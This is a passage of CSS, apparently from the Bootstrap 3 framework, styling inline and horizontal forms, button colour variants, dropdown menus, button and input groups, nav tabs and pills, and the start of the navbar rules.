        .form-inline .form-control-static {
          display: inline-block;
        }
        .form-inline .input-group {
          display: inline-table;
          vertical-align: middle;
        }
        .form-inline .input-group .form-control,
        .form-inline .input-group .input-group-addon,
        .form-inline .input-group .input-group-btn {
          width: auto;
        }
        .form-inline .input-group > .form-control {
          width: 100%;
        }
        .form-inline .control-label {
          margin-bottom: 0;
          vertical-align: middle;
        }
        .form-inline .checkbox,
        .form-inline .radio {
          display: inline-block;
          margin-top: 0;
          margin-bottom: 0;
          vertical-align: middle;
        }
        .form-inline .checkbox label,
        .form-inline .radio label {
          padding-left: 0;
        }
        .form-inline .checkbox input[type="checkbox"],
        .form-inline .radio input[type="radio"] {
          position: relative;
          margin-left: 0;
        }
        .form-inline .has-feedback .form-control-feedback {
          top: 0;
        }
      }
      .form-horizontal .checkbox,
      .form-horizontal .checkbox-inline,
      .form-horizontal .radio,
      .form-horizontal .radio-inline {
        padding-top: 7px;
        margin-top: 0;
        margin-bottom: 0;
      }
      .form-horizontal .checkbox,
      .form-horizontal .radio {
        min-height: 27px;
      }
      .form-horizontal .form-group {
        margin-right: -15px;
        margin-left: -15px;
      }
      @media (min-width: 768px) {
        .form-horizontal .control-label {
          padding-top: 7px;
          margin-bottom: 0;
          text-align: right;
        }
      }
      .form-horizontal .has-feedback .form-control-feedback {
        right: 15px;
      }
      @media (min-width: 768px) {
        .form-horizontal .form-group-lg .control-label {
          padding-top: 11px;
          font-size: 18px;
        }
      }
      @media (min-width: 768px) {
        .form-horizontal .form-group-sm .control-label {
          padding-top: 6px;
          font-size: 12px;
        }
      }
      .btn {
        display: inline-block;
        padding: 6px 12px;
        margin-bottom: 0;
        font-size: 14px;
        font-weight: 400;
        line-height: 1.42857143;
        text-align: center;
        white-space: nowrap;
        vertical-align: middle;
        -ms-touch-action: manipulation;
        touch-action: manipulation;
        cursor: pointer;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        background-image: none;
        border: 1px solid transparent;
        border-radius: 4px;
      }
      .btn.active.focus,
      .btn.active:focus,
      .btn.focus,
      .btn:active.focus,
      .btn:active:focus,
      .btn:focus {
        outline: 5px auto -webkit-focus-ring-color;
        outline-offset: -2px;
      }
      .btn.focus,
      .btn:focus,
      .btn:hover {
        color: #333;
        text-decoration: none;
      }
      .btn.active,
      .btn:active {
        background-image: none;
        outline: 0;
        -webkit-box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
        box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
      }
      .btn.disabled,
      .btn[disabled],
      fieldset[disabled] .btn {
        cursor: not-allowed;
        filter: alpha(opacity=65);
        -webkit-box-shadow: none;
        box-shadow: none;
        opacity: 0.65;
      }
      a.btn.disabled,
      fieldset[disabled] a.btn {
        pointer-events: none;
      }
      .btn-default {
        color: #333;
        background-color: #fff;
        border-color: #ccc;
      }
      .btn-default.focus,
      .btn-default:focus {
        color: #333;
        background-color: #e6e6e6;
        border-color: #8c8c8c;
      }
      .btn-default:hover {
        color: #333;
        background-color: #e6e6e6;
        border-color: #adadad;
      }
      .btn-default.active,
      .btn-default:active,
      .open > .dropdown-toggle.btn-default {
        color: #333;
        background-color: #e6e6e6;
        border-color: #adadad;
      }
      .btn-default.active.focus,
      .btn-default.active:focus,
      .btn-default.active:hover,
      .btn-default:active.focus,
      .btn-default:active:focus,
      .btn-default:active:hover,
      .open > .dropdown-toggle.btn-default.focus,
      .open > .dropdown-toggle.btn-default:focus,
      .open > .dropdown-toggle.btn-default:hover {
        color: #333;
        background-color: #d4d4d4;
        border-color: #8c8c8c;
      }
      .btn-default.active,
      .btn-default:active,
      .open > .dropdown-toggle.btn-default {
        background-image: none;
      }
      .btn-default.disabled.focus,
      .btn-default.disabled:focus,
      .btn-default.disabled:hover,
      .btn-default[disabled].focus,
      .btn-default[disabled]:focus,
      .btn-default[disabled]:hover,
      fieldset[disabled] .btn-default.focus,
      fieldset[disabled] .btn-default:focus,
      fieldset[disabled] .btn-default:hover {
        background-color: #fff;
        border-color: #ccc;
      }
      .btn-default .badge {
        color: #fff;
        background-color: #333;
      }
      .btn-primary {
        color: #fff;
        background-color: #337ab7;
        border-color: #2e6da4;
      }
      .btn-primary.focus,
      .btn-primary:focus {
        color: #fff;
        background-color: #286090;
        border-color: #122b40;
      }
      .btn-primary:hover {
        color: #fff;
        background-color: #286090;
        border-color: #204d74;
      }
      .btn-primary.active,
      .btn-primary:active,
      .open > .dropdown-toggle.btn-primary {
        color: #fff;
        background-color: #286090;
        border-color: #204d74;
      }
      .btn-primary.active.focus,
      .btn-primary.active:focus,
      .btn-primary.active:hover,
      .btn-primary:active.focus,
      .btn-primary:active:focus,
      .btn-primary:active:hover,
      .open > .dropdown-toggle.btn-primary.focus,
      .open > .dropdown-toggle.btn-primary:focus,
      .open > .dropdown-toggle.btn-primary:hover {
        color: #fff;
        background-color: #204d74;
        border-color: #122b40;
      }
      .btn-primary.active,
      .btn-primary:active,
      .open > .dropdown-toggle.btn-primary {
        background-image: none;
      }
      .btn-primary.disabled.focus,
      .btn-primary.disabled:focus,
      .btn-primary.disabled:hover,
      .btn-primary[disabled].focus,
      .btn-primary[disabled]:focus,
      .btn-primary[disabled]:hover,
      fieldset[disabled] .btn-primary.focus,
      fieldset[disabled] .btn-primary:focus,
      fieldset[disabled] .btn-primary:hover {
        background-color: #337ab7;
        border-color: #2e6da4;
      }
      .btn-primary .badge {
        color: #337ab7;
        background-color: #fff;
      }
      .btn-success {
        color: #fff;
        background-color: #5cb85c;
        border-color: #4cae4c;
      }
      .btn-success.focus,
      .btn-success:focus {
        color: #fff;
        background-color: #449d44;
        border-color: #255625;
      }
      .btn-success:hover {
        color: #fff;
        background-color: #449d44;
        border-color: #398439;
      }
      .btn-success.active,
      .btn-success:active,
      .open > .dropdown-toggle.btn-success {
        color: #fff;
        background-color: #449d44;
        border-color: #398439;
      }
      .btn-success.active.focus,
      .btn-success.active:focus,
      .btn-success.active:hover,
      .btn-success:active.focus,
      .btn-success:active:focus,
      .btn-success:active:hover,
      .open > .dropdown-toggle.btn-success.focus,
      .open > .dropdown-toggle.btn-success:focus,
      .open > .dropdown-toggle.btn-success:hover {
        color: #fff;
        background-color: #398439;
        border-color: #255625;
      }
      .btn-success.active,
      .btn-success:active,
      .open > .dropdown-toggle.btn-success {
        background-image: none;
      }
      .btn-success.disabled.focus,
      .btn-success.disabled:focus,
      .btn-success.disabled:hover,
      .btn-success[disabled].focus,
      .btn-success[disabled]:focus,
      .btn-success[disabled]:hover,
      fieldset[disabled] .btn-success.focus,
      fieldset[disabled] .btn-success:focus,
      fieldset[disabled] .btn-success:hover {
        background-color: #5cb85c;
        border-color: #4cae4c;
      }
      .btn-success .badge {
        color: #5cb85c;
        background-color: #fff;
      }
      .btn-info {
        color: #fff;
        background-color: #5bc0de;
        border-color: #46b8da;
      }
      .btn-info.focus,
      .btn-info:focus {
        color: #fff;
        background-color: #31b0d5;
        border-color: #1b6d85;
      }
      .btn-info:hover {
        color: #fff;
        background-color: #31b0d5;
        border-color: #269abc;
      }
      .btn-info.active,
      .btn-info:active,
      .open > .dropdown-toggle.btn-info {
        color: #fff;
        background-color: #31b0d5;
        border-color: #269abc;
      }
      .btn-info.active.focus,
      .btn-info.active:focus,
      .btn-info.active:hover,
      .btn-info:active.focus,
      .btn-info:active:focus,
      .btn-info:active:hover,
      .open > .dropdown-toggle.btn-info.focus,
      .open > .dropdown-toggle.btn-info:focus,
      .open > .dropdown-toggle.btn-info:hover {
        color: #fff;
        background-color: #269abc;
        border-color: #1b6d85;
      }
      .btn-info.active,
      .btn-info:active,
      .open > .dropdown-toggle.btn-info {
        background-image: none;
      }
      .btn-info.disabled.focus,
      .btn-info.disabled:focus,
      .btn-info.disabled:hover,
      .btn-info[disabled].focus,
      .btn-info[disabled]:focus,
      .btn-info[disabled]:hover,
      fieldset[disabled] .btn-info.focus,
      fieldset[disabled] .btn-info:focus,
      fieldset[disabled] .btn-info:hover {
        background-color: #5bc0de;
        border-color: #46b8da;
      }
      .btn-info .badge {
        color: #5bc0de;
        background-color: #fff;
      }
      .btn-warning {
        color: #fff;
        background-color: #f0ad4e;
        border-color: #eea236;
      }
      .btn-warning.focus,
      .btn-warning:focus {
        color: #fff;
        background-color: #ec971f;
        border-color: #985f0d;
      }
      .btn-warning:hover {
        color: #fff;
        background-color: #ec971f;
        border-color: #d58512;
      }
      .btn-warning.active,
      .btn-warning:active,
      .open > .dropdown-toggle.btn-warning {
        color: #fff;
        background-color: #ec971f;
        border-color: #d58512;
      }
      .btn-warning.active.focus,
      .btn-warning.active:focus,
      .btn-warning.active:hover,
      .btn-warning:active.focus,
      .btn-warning:active:focus,
      .btn-warning:active:hover,
      .open > .dropdown-toggle.btn-warning.focus,
      .open > .dropdown-toggle.btn-warning:focus,
      .open > .dropdown-toggle.btn-warning:hover {
        color: #fff;
        background-color: #d58512;
        border-color: #985f0d;
      }
      .btn-warning.active,
      .btn-warning:active,
      .open > .dropdown-toggle.btn-warning {
        background-image: none;
      }
      .btn-warning.disabled.focus,
      .btn-warning.disabled:focus,
      .btn-warning.disabled:hover,
      .btn-warning[disabled].focus,
      .btn-warning[disabled]:focus,
      .btn-warning[disabled]:hover,
      fieldset[disabled] .btn-warning.focus,
      fieldset[disabled] .btn-warning:focus,
      fieldset[disabled] .btn-warning:hover {
        background-color: #f0ad4e;
        border-color: #eea236;
      }
      .btn-warning .badge {
        color: #f0ad4e;
        background-color: #fff;
      }
      .btn-danger {
        color: #fff;
        background-color: #d9534f;
        border-color: #d43f3a;
      }
      .btn-danger.focus,
      .btn-danger:focus {
        color: #fff;
        background-color: #c9302c;
        border-color: #761c19;
      }
      .btn-danger:hover {
        color: #fff;
        background-color: #c9302c;
        border-color: #ac2925;
      }
      .btn-danger.active,
      .btn-danger:active,
      .open > .dropdown-toggle.btn-danger {
        color: #fff;
        background-color: #c9302c;
        border-color: #ac2925;
      }
      .btn-danger.active.focus,
      .btn-danger.active:focus,
      .btn-danger.active:hover,
      .btn-danger:active.focus,
      .btn-danger:active:focus,
      .btn-danger:active:hover,
      .open > .dropdown-toggle.btn-danger.focus,
      .open > .dropdown-toggle.btn-danger:focus,
      .open > .dropdown-toggle.btn-danger:hover {
        color: #fff;
        background-color: #ac2925;
        border-color: #761c19;
      }
      .btn-danger.active,
      .btn-danger:active,
      .open > .dropdown-toggle.btn-danger {
        background-image: none;
      }
      .btn-danger.disabled.focus,
      .btn-danger.disabled:focus,
      .btn-danger.disabled:hover,
      .btn-danger[disabled].focus,
      .btn-danger[disabled]:focus,
      .btn-danger[disabled]:hover,
      fieldset[disabled] .btn-danger.focus,
      fieldset[disabled] .btn-danger:focus,
      fieldset[disabled] .btn-danger:hover {
        background-color: #d9534f;
        border-color: #d43f3a;
      }
      .btn-danger .badge {
        color: #d9534f;
        background-color: #fff;
      }
      .btn-link {
        font-weight: 400;
        color: #337ab7;
        border-radius: 0;
      }
      .btn-link,
      .btn-link.active,
      .btn-link:active,
      .btn-link[disabled],
      fieldset[disabled] .btn-link {
        background-color: transparent;
        -webkit-box-shadow: none;
        box-shadow: none;
      }
      .btn-link,
      .btn-link:active,
      .btn-link:focus,
      .btn-link:hover {
        border-color: transparent;
      }
      .btn-link:focus,
      .btn-link:hover {
        color: #23527c;
        text-decoration: underline;
        background-color: transparent;
      }
      .btn-link[disabled]:focus,
      .btn-link[disabled]:hover,
      fieldset[disabled] .btn-link:focus,
      fieldset[disabled] .btn-link:hover {
        color: #777;
        text-decoration: none;
      }
      .btn-group-lg > .btn,
      .btn-lg {
        padding: 10px 16px;
        font-size: 18px;
        line-height: 1.3333333;
        border-radius: 6px;
      }
      .btn-group-sm > .btn,
      .btn-sm {
        padding: 5px 10px;
        font-size: 12px;
        line-height: 1.5;
        border-radius: 3px;
      }
      .btn-group-xs > .btn,
      .btn-xs {
        padding: 1px 5px;
        font-size: 12px;
        line-height: 1.5;
        border-radius: 3px;
      }
      .btn-block {
        display: block;
        width: 100%;
      }
      .btn-block + .btn-block {
        margin-top: 5px;
      }
      input[type="button"].btn-block,
      input[type="reset"].btn-block,
      input[type="submit"].btn-block {
        width: 100%;
      }
      .fade {
        opacity: 0;
        -webkit-transition: opacity 0.15s linear;
        -o-transition: opacity 0.15s linear;
        transition: opacity 0.15s linear;
      }
      .fade.in {
        opacity: 1;
      }
      .collapse {
        display: none;
      }
      .collapse.in {
        display: block;
      }
      tr.collapse.in {
        display: table-row;
      }
      tbody.collapse.in {
        display: table-row-group;
      }
      .collapsing {
        position: relative;
        height: 0;
        overflow: hidden;
        -webkit-transition-timing-function: ease;
        -o-transition-timing-function: ease;
        transition-timing-function: ease;
        -webkit-transition-duration: 0.35s;
        -o-transition-duration: 0.35s;
        transition-duration: 0.35s;
        -webkit-transition-property: height, visibility;
        -o-transition-property: height, visibility;
        transition-property: height, visibility;
      }
      .caret {
        display: inline-block;
        width: 0;
        height: 0;
        margin-left: 2px;
        vertical-align: middle;
        border-top: 4px dashed;
        border-top: 4px solid\9;
        border-right: 4px solid transparent;
        border-left: 4px solid transparent;
      }
      .dropdown,
      .dropup {
        position: relative;
      }
      .dropdown-toggle:focus {
        outline: 0;
      }
      .dropdown-menu {
        position: absolute;
        top: 100%;
        left: 0;
        z-index: 1000;
        display: none;
        float: left;
        min-width: 160px;
        padding: 5px 0;
        margin: 2px 0 0;
        font-size: 14px;
        text-align: left;
        list-style: none;
        background-color: #fff;
        -webkit-background-clip: padding-box;
        background-clip: padding-box;
        border: 1px solid #ccc;
        border: 1px solid rgba(0, 0, 0, 0.15);
        border-radius: 4px;
        -webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, 0.175);
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.175);
      }
      .dropdown-menu.pull-right {
        right: 0;
        left: auto;
      }
      .dropdown-menu .divider {
        height: 1px;
        margin: 9px 0;
        overflow: hidden;
        background-color: #e5e5e5;
      }
      .dropdown-menu > li > a {
        display: block;
        padding: 3px 20px;
        clear: both;
        font-weight: 400;
        line-height: 1.42857143;
        color: #333;
        white-space: nowrap;
      }
      .dropdown-menu > li > a:focus,
      .dropdown-menu > li > a:hover {
        color: #262626;
        text-decoration: none;
        background-color: #f5f5f5;
      }
      .dropdown-menu > .active > a,
      .dropdown-menu > .active > a:focus,
      .dropdown-menu > .active > a:hover {
        color: #fff;
        text-decoration: none;
        background-color: #337ab7;
        outline: 0;
      }
      .dropdown-menu > .disabled > a,
      .dropdown-menu > .disabled > a:focus,
      .dropdown-menu > .disabled > a:hover {
        color: #777;
      }
      .dropdown-menu > .disabled > a:focus,
      .dropdown-menu > .disabled > a:hover {
        text-decoration: none;
        cursor: not-allowed;
        background-color: transparent;
        background-image: none;
        filter: progid:DXImageTransform.Microsoft.gradient(enabled=false);
      }
      .open > .dropdown-menu {
        display: block;
      }
      .open > a {
        outline: 0;
      }
      .dropdown-menu-right {
        right: 0;
        left: auto;
      }
      .dropdown-menu-left {
        right: auto;
        left: 0;
      }
      .dropdown-header {
        display: block;
        padding: 3px 20px;
        font-size: 12px;
        line-height: 1.42857143;
        color: #777;
        white-space: nowrap;
      }
      .dropdown-backdrop {
        position: fixed;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        z-index: 990;
      }
      .pull-right > .dropdown-menu {
        right: 0;
        left: auto;
      }
      .dropup .caret,
      .navbar-fixed-bottom .dropdown .caret {
        content: "";
        border-top: 0;
        border-bottom: 4px dashed;
        border-bottom: 4px solid\9;
      }
      .dropup .dropdown-menu,
      .navbar-fixed-bottom .dropdown .dropdown-menu {
        top: auto;
        bottom: 100%;
        margin-bottom: 2px;
      }
      @media (min-width: 768px) {
        .navbar-right .dropdown-menu {
          right: 0;
          left: auto;
        }
        .navbar-right .dropdown-menu-left {
          right: auto;
          left: 0;
        }
      }
      .btn-group,
      .btn-group-vertical {
        position: relative;
        display: inline-block;
        vertical-align: middle;
      }
      .btn-group-vertical > .btn,
      .btn-group > .btn {
        position: relative;
        float: left;
      }
      .btn-group-vertical > .btn.active,
      .btn-group-vertical > .btn:active,
      .btn-group-vertical > .btn:focus,
      .btn-group-vertical > .btn:hover,
      .btn-group > .btn.active,
      .btn-group > .btn:active,
      .btn-group > .btn:focus,
      .btn-group > .btn:hover {
        z-index: 2;
      }
      .btn-group .btn + .btn,
      .btn-group .btn + .btn-group,
      .btn-group .btn-group + .btn,
      .btn-group .btn-group + .btn-group {
        margin-left: -1px;
      }
      .btn-toolbar {
        margin-left: -5px;
      }
      .btn-toolbar .btn,
      .btn-toolbar .btn-group,
      .btn-toolbar .input-group {
        float: left;
      }
      .btn-toolbar > .btn,
      .btn-toolbar > .btn-group,
      .btn-toolbar > .input-group {
        margin-left: 5px;
      }
      .btn-group > .btn:not(:first-child):not(:last-child):not(.dropdown-toggle) {
        border-radius: 0;
      }
      .btn-group > .btn:first-child {
        margin-left: 0;
      }
      .btn-group > .btn:first-child:not(:last-child):not(.dropdown-toggle) {
        border-top-right-radius: 0;
        border-bottom-right-radius: 0;
      }
      .btn-group > .btn:last-child:not(:first-child),
      .btn-group > .dropdown-toggle:not(:first-child) {
        border-top-left-radius: 0;
        border-bottom-left-radius: 0;
      }
      .btn-group > .btn-group {
        float: left;
      }
      .btn-group > .btn-group:not(:first-child):not(:last-child) > .btn {
        border-radius: 0;
      }
      .btn-group > .btn-group:first-child:not(:last-child) > .btn:last-child,
      .btn-group > .btn-group:first-child:not(:last-child) > .dropdown-toggle {
        border-top-right-radius: 0;
        border-bottom-right-radius: 0;
      }
      .btn-group > .btn-group:last-child:not(:first-child) > .btn:first-child {
        border-top-left-radius: 0;
        border-bottom-left-radius: 0;
      }
      .btn-group .dropdown-toggle:active,
      .btn-group.open .dropdown-toggle {
        outline: 0;
      }
      .btn-group > .btn + .dropdown-toggle {
        padding-right: 8px;
        padding-left: 8px;
      }
      .btn-group > .btn-lg + .dropdown-toggle {
        padding-right: 12px;
        padding-left: 12px;
      }
      .btn-group.open .dropdown-toggle {
        -webkit-box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
        box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
      }
      .btn-group.open .dropdown-toggle.btn-link {
        -webkit-box-shadow: none;
        box-shadow: none;
      }
      .btn .caret {
        margin-left: 0;
      }
      .btn-lg .caret {
        border-width: 5px 5px 0;
        border-bottom-width: 0;
      }
      .dropup .btn-lg .caret {
        border-width: 0 5px 5px;
      }
      .btn-group-vertical > .btn,
      .btn-group-vertical > .btn-group,
      .btn-group-vertical > .btn-group > .btn {
        display: block;
        float: none;
        width: 100%;
        max-width: 100%;
      }
      .btn-group-vertical > .btn-group > .btn {
        float: none;
      }
      .btn-group-vertical > .btn + .btn,
      .btn-group-vertical > .btn + .btn-group,
      .btn-group-vertical > .btn-group + .btn,
      .btn-group-vertical > .btn-group + .btn-group {
        margin-top: -1px;
        margin-left: 0;
      }
      .btn-group-vertical > .btn:not(:first-child):not(:last-child) {
        border-radius: 0;
      }
      .btn-group-vertical > .btn:first-child:not(:last-child) {
        border-top-left-radius: 4px;
        border-top-right-radius: 4px;
        border-bottom-right-radius: 0;
        border-bottom-left-radius: 0;
      }
      .btn-group-vertical > .btn:last-child:not(:first-child) {
        border-top-left-radius: 0;
        border-top-right-radius: 0;
        border-bottom-right-radius: 4px;
        border-bottom-left-radius: 4px;
      }
      .btn-group-vertical > .btn-group:not(:first-child):not(:last-child) > .btn {
        border-radius: 0;
      }
      .btn-group-vertical > .btn-group:first-child:not(:last-child) > .btn:last-child,
      .btn-group-vertical > .btn-group:first-child:not(:last-child) > .dropdown-toggle {
        border-bottom-right-radius: 0;
        border-bottom-left-radius: 0;
      }
      .btn-group-vertical > .btn-group:last-child:not(:first-child) > .btn:first-child {
        border-top-left-radius: 0;
        border-top-right-radius: 0;
      }
      .btn-group-justified {
        display: table;
        width: 100%;
        table-layout: fixed;
        border-collapse: separate;
      }
      .btn-group-justified > .btn,
      .btn-group-justified > .btn-group {
        display: table-cell;
        float: none;
        width: 1%;
      }
      .btn-group-justified > .btn-group .btn {
        width: 100%;
      }
      .btn-group-justified > .btn-group .dropdown-menu {
        left: auto;
      }
      [data-toggle="buttons"] > .btn input[type="checkbox"],
      [data-toggle="buttons"] > .btn input[type="radio"],
      [data-toggle="buttons"] > .btn-group > .btn input[type="checkbox"],
      [data-toggle="buttons"] > .btn-group > .btn input[type="radio"] {
        position: absolute;
        clip: rect(0, 0, 0, 0);
        pointer-events: none;
      }
      .input-group {
        position: relative;
        display: table;
        border-collapse: separate;
      }
      .input-group[class*="col-"] {
        float: none;
        padding-right: 0;
        padding-left: 0;
      }
      .input-group .form-control {
        position: relative;
        z-index: 2;
        float: left;
        width: 100%;
        margin-bottom: 0;
      }
      .input-group .form-control:focus {
        z-index: 3;
      }
      .input-group-lg > .form-control,
      .input-group-lg > .input-group-addon,
      .input-group-lg > .input-group-btn > .btn {
        height: 46px;
        padding: 10px 16px;
        font-size: 18px;
        line-height: 1.3333333;
        border-radius: 6px;
      }
      select.input-group-lg > .form-control,
      select.input-group-lg > .input-group-addon,
      select.input-group-lg > .input-group-btn > .btn {
        height: 46px;
        line-height: 46px;
      }
      select[multiple].input-group-lg > .form-control,
      select[multiple].input-group-lg > .input-group-addon,
      select[multiple].input-group-lg > .input-group-btn > .btn,
      textarea.input-group-lg > .form-control,
      textarea.input-group-lg > .input-group-addon,
      textarea.input-group-lg > .input-group-btn > .btn {
        height: auto;
      }
      .input-group-sm > .form-control,
      .input-group-sm > .input-group-addon,
      .input-group-sm > .input-group-btn > .btn {
        height: 30px;
        padding: 5px 10px;
        font-size: 12px;
        line-height: 1.5;
        border-radius: 3px;
      }
      select.input-group-sm > .form-control,
      select.input-group-sm > .input-group-addon,
      select.input-group-sm > .input-group-btn > .btn {
        height: 30px;
        line-height: 30px;
      }
      select[multiple].input-group-sm > .form-control,
      select[multiple].input-group-sm > .input-group-addon,
      select[multiple].input-group-sm > .input-group-btn > .btn,
      textarea.input-group-sm > .form-control,
      textarea.input-group-sm > .input-group-addon,
      textarea.input-group-sm > .input-group-btn > .btn {
        height: auto;
      }
      .input-group .form-control,
      .input-group-addon,
      .input-group-btn {
        display: table-cell;
      }
      .input-group .form-control:not(:first-child):not(:last-child),
      .input-group-addon:not(:first-child):not(:last-child),
      .input-group-btn:not(:first-child):not(:last-child) {
        border-radius: 0;
      }
      .input-group-addon,
      .input-group-btn {
        width: 1%;
        white-space: nowrap;
        vertical-align: middle;
      }
      .input-group-addon {
        padding: 6px 12px;
        font-size: 14px;
        font-weight: 400;
        line-height: 1;
        color: #555;
        text-align: center;
        background-color: #eee;
        border: 1px solid #ccc;
        border-radius: 4px;
      }
      .input-group-addon.input-sm {
        padding: 5px 10px;
        font-size: 12px;
        border-radius: 3px;
      }
      .input-group-addon.input-lg {
        padding: 10px 16px;
        font-size: 18px;
        border-radius: 6px;
      }
      .input-group-addon input[type="checkbox"],
      .input-group-addon input[type="radio"] {
        margin-top: 0;
      }
      .input-group .form-control:first-child,
      .input-group-addon:first-child,
      .input-group-btn:first-child > .btn,
      .input-group-btn:first-child > .btn-group > .btn,
      .input-group-btn:first-child > .dropdown-toggle,
      .input-group-btn:last-child > .btn-group:not(:last-child) > .btn,
      .input-group-btn:last-child > .btn:not(:last-child):not(.dropdown-toggle) {
        border-top-right-radius: 0;
        border-bottom-right-radius: 0;
      }
      .input-group-addon:first-child {
        border-right: 0;
      }
      .input-group .form-control:last-child,
      .input-group-addon:last-child,
      .input-group-btn:first-child > .btn-group:not(:first-child) > .btn,
      .input-group-btn:first-child > .btn:not(:first-child),
      .input-group-btn:last-child > .btn,
      .input-group-btn:last-child > .btn-group > .btn,
      .input-group-btn:last-child > .dropdown-toggle {
        border-top-left-radius: 0;
        border-bottom-left-radius: 0;
      }
      .input-group-addon:last-child {
        border-left: 0;
      }
      .input-group-btn {
        position: relative;
        font-size: 0;
        white-space: nowrap;
      }
      .input-group-btn > .btn {
        position: relative;
      }
      .input-group-btn > .btn + .btn {
        margin-left: -1px;
      }
      .input-group-btn > .btn:active,
      .input-group-btn > .btn:focus,
      .input-group-btn > .btn:hover {
        z-index: 2;
      }
      .input-group-btn:first-child > .btn,
      .input-group-btn:first-child > .btn-group {
        margin-right: -1px;
      }
      .input-group-btn:last-child > .btn,
      .input-group-btn:last-child > .btn-group {
        z-index: 2;
        margin-left: -1px;
      }
      .nav {
        padding-left: 0;
        margin-bottom: 0;
        list-style: none;
      }
      .nav > li {
        position: relative;
        display: block;
      }
      .nav > li > a {
        position: relative;
        display: block;
        padding: 10px 15px;
      }
      .nav > li > a:focus,
      .nav > li > a:hover {
        text-decoration: none;
        background-color: #eee;
      }
      .nav > li.disabled > a {
        color: #777;
      }
      .nav > li.disabled > a:focus,
      .nav > li.disabled > a:hover {
        color: #777;
        text-decoration: none;
        cursor: not-allowed;
        background-color: transparent;
      }
      .nav .open > a,
      .nav .open > a:focus,
      .nav .open > a:hover {
        background-color: #eee;
        border-color: #337ab7;
      }
      .nav .nav-divider {
        height: 1px;
        margin: 9px 0;
        overflow: hidden;
        background-color: #e5e5e5;
      }
      .nav > li > a > img {
        max-width: none;
      }
      .nav-tabs {
        border-bottom: 1px solid #ddd;
      }
      .nav-tabs > li {
        float: left;
        margin-bottom: -1px;
      }
      .nav-tabs > li > a {
        margin-right: 2px;
        line-height: 1.42857143;
        border: 1px solid transparent;
        border-radius: 4px 4px 0 0;
      }
      .nav-tabs > li > a:hover {
        border-color: #eee #eee #ddd;
      }
      .nav-tabs > li.active > a,
      .nav-tabs > li.active > a:focus,
      .nav-tabs > li.active > a:hover {
        color: #555;
        cursor: default;
        background-color: #fff;
        border: 1px solid #ddd;
        border-bottom-color: transparent;
      }
      .nav-tabs.nav-justified {
        width: 100%;
        border-bottom: 0;
      }
      .nav-tabs.nav-justified > li {
        float: none;
      }
      .nav-tabs.nav-justified > li > a {
        margin-bottom: 5px;
        text-align: center;
      }
      .nav-tabs.nav-justified > .dropdown .dropdown-menu {
        top: auto;
        left: auto;
      }
      @media (min-width: 768px) {
        .nav-tabs.nav-justified > li {
          display: table-cell;
          width: 1%;
        }
        .nav-tabs.nav-justified > li > a {
          margin-bottom: 0;
        }
      }
      .nav-tabs.nav-justified > li > a {
        margin-right: 0;
        border-radius: 4px;
      }
      .nav-tabs.nav-justified > .active > a,
      .nav-tabs.nav-justified > .active > a:focus,
      .nav-tabs.nav-justified > .active > a:hover {
        border: 1px solid #ddd;
      }
      @media (min-width: 768px) {
        .nav-tabs.nav-justified > li > a {
          border-bottom: 1px solid #ddd;
          border-radius: 4px 4px 0 0;
        }
        .nav-tabs.nav-justified > .active > a,
        .nav-tabs.nav-justified > .active > a:focus,
        .nav-tabs.nav-justified > .active > a:hover {
          border-bottom-color: #fff;
        }
      }
      .nav-pills > li {
        float: left;
      }
      .nav-pills > li > a {
        border-radius: 4px;
      }
      .nav-pills > li + li {
        margin-left: 2px;
      }
      .nav-pills > li.active > a,
      .nav-pills > li.active > a:focus,
      .nav-pills > li.active > a:hover {
        color: #fff;
        background-color: #337ab7;
      }
      .nav-stacked > li {
        float: none;
      }
      .nav-stacked > li + li {
        margin-top: 2px;
        margin-left: 0;
      }
      .nav-justified {
        width: 100%;
      }
      .nav-justified > li {
        float: none;
      }
      .nav-justified > li > a {
        margin-bottom: 5px;
        text-align: center;
      }
      .nav-justified > .dropdown .dropdown-menu {
        top: auto;
        left: auto;
      }
      @media (min-width: 768px) {
        .nav-justified > li {
          display: table-cell;
          width: 1%;
        }
        .nav-justified > li > a {
          margin-bottom: 0;
        }
      }
      .nav-tabs-justified {
        border-bottom: 0;
      }
      .nav-tabs-justified > li > a {
        margin-right: 0;
        border-radius: 4px;
      }
      .nav-tabs-justified > .active > a,
      .nav-tabs-justified > .active > a:focus,
      .nav-tabs-justified > .active > a:hover {
        border: 1px solid #ddd;
      }
      @media (min-width: 768px) {
        .nav-tabs-justified > li > a {
          border-bottom: 1px solid #ddd;
          border-radius: 4px 4px 0 0;
        }
        .nav-tabs-justified > .active > a,
        .nav-tabs-justified > .active > a:focus,
        .nav-tabs-justified > .active > a:hover {
          border-bottom-color: #fff;
        }
      }
      .tab-content > .tab-pane {
        display: none;
      }
      .tab-content > .active {
        display: block;
      }
      .nav-tabs .dropdown-menu {
        margin-top: -1px;
        border-top-left-radius: 0;
        border-top-right-radius: 0;
      }
      .navbar {
        position: relative;
        min-height: 50px;
        margin-bottom: 20px;
        border: 1px solid transparent;
      }
      @media (min-width: 768px) {
        .navbar {
          border-radius: 4px;
        }
      }
      @media (min-width: 768px) {
        .navbar-header {
          float: left;
        }
      }
      .navbar-collapse {
        padding-right: 15px;
        padding-left: 15px;
        overflow-x: visible;
        -webkit-overflow-scrolling: touch;
        border-top: 1px solid transparent;
        -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.1);
        box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.1);
      }
      .navbar-collapse.in {
        overflow-y: auto;
      }
      @media (min-width: 768px) {
        .navbar-collapse {
          width: auto;
          border-top: 0;
          -webkit-box-shadow: none;
          box-shadow: none;
        }
        .navbar-collapse.collapse {
          display: block !important;
          height: auto !important;
          padding-bottom: 0;
          overflow: visible !important;
        }
        .navbar-collapse.in {
          overflow-y: visible;
        }
        .navbar-fixed-bottom .navbar-collapse,
        .navbar-fixed-top .navbar-collapse,
        .navbar-static-top .navbar-collapse {
          padding-right: 0;
          padding-left: 0;
        }
      }
      .navbar-fixed-bottom .navbar-collapse,
      .navbar-fixed-top .navbar-collapse {
        max-height: 340px;
      }
      @media (max-device-width: 480px) and (orientation: landscape) {
        .navbar-fixed-bottom .navbar-collapse,
